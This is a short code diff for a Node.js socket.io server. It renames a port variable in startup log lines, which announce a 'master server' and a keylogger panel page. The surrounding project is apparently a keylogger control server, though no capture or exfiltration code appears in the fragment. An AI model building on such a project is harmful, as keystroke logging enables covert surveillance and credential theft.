@@ -96,10 +96,10 @@ io.on('connection', (socket) => {
   });
 });
 
-server.listen(port, () => {
+server.listen(PORT, () => {
   console.log(`\n🚀 SERVIDOR MAESTRO ACTIVO`);
   console.log(`----------------------------------`);
-  console.log(`🌐 Panel: http://localhost:${port}/keylogger.html`);
-  console.log(`📡 Socket: Puerto ${port}`);
+  console.log(`🌐 Panel: http://localhost:${PORT}/keylogger.html`);
+  console.log(`📡 Socket: Puerto ${PORT}`);
   console.log(`----------------------------------\n`);
 });
